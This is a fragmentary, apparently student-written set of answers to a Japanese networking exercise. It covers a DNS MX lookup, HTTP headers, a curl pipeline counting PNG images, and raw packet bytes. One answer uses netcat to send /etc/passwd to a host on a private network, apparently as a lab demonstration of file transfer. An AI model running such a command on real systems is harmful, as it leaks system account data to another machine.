...
std.it-college.ac.jp.   3600   IN   MX   mail.it-college.ac.jp.
メールサーバ：mail.it-college.ac.jp
...
HTTP/2 200 
server: nginx
date: Wed, 26 Nov 2025 05:28:20 GMT
...
```txt
解答欄
curl -s https://www.it-college.ac.jp/ | grep ".png" | wc -l
の実行結果より、PNG画像ファイルは24個である。
...
```txt
解答欄  
nc 172.16.41.76 55555 < /etc/passwd
...
4 5 00
00 10   00 54  5b  fc 40 00 40 01 0e 33 c0 a8 14 e3 a3 2b
